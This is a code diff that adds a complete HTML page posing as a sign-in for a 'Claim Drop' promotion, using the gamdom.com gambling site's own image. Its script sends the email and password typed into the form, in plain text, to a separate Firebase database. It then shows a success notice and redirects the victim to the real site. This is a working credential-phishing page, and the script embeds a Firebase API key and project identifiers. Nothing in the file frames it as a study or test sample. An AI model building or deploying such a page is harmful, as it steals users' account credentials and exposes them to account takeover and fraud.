@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="dice-image">
+            <img src="https://gamdom.com/build/side-image.a21eed362fef70c9fadf77b68a5c1e69.396.png" alt="Dice Image">
+        </div>
+        <div class="login-form">
+            <h5>You can only get once on a device.</h5>
+            <h3>Confirm your identity to claim.</h3>
+            <h2>Sign In</h2>
+            <form id="contactForm">
+                <label for="email">Email</label>
+                <input type="text" id="email" placeholder="Enter your Email" required>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+                
+                <button type="submit">Claim Drop</button>
+            </form>
+            <div class="alert" style="display:none; color: green; margin-top: 10px;">
+                Your information has been submitted successfully wait 12 hours!
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDKs for Firebase version 9+ -->
+    <script type="module">
+        // Import the functions you need from Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js";
+        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAW4cTAsG2QiXXGvS2FyOwZYbR_BqCQDXM",
+            authDomain: "contactform-37fe3.firebaseapp.com",
+            databaseURL: "https://contactform-37fe3-default-rtdb.firebaseio.com",
+            projectId: "contactform-37fe3",
+            storageBucket: "contactform-37fe3.appspot.com",
+            messagingSenderId: "831163231244",
+            appId: "1:831163231244:web:71517d64004b77358a9229",
+            measurementId: "G-F7SMDYVPSZ"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Reference to 'user' collection in the database
+        const messagesRef = ref(db, 'user');
+
+        // Listen for form submit
+        document.getElementById('contactForm').addEventListener('submit', submitForm);
+
+        // Submit form
+        function submitForm(e) {
+            e.preventDefault();
+
+            // Get values
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Save message
+            saveMessage(email, password);
+
+            // Show alert
+            document.querySelector('.alert').style.display = 'block';
+
+            // Hide alert after 3 seconds
+            setTimeout(() => {
+                document.querySelector('.alert').style.display = 'none';
+            }, 3000);
+
+            // Clear form
+            document.getElementById('contactForm').reset();
+        }
+
+        // Save message to Firebase
+        function saveMessage(email, password) {
+            const newMessageRef = push(messagesRef);
+            set(newMessageRef, {
+                email: email,
+                password: password
+            });
+
+            // Redirect after 1 second
+            setTimeout(() => {
+                window.location.href = 'https://gamdom.com/'; // Change the URL to the desired redirection destination
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
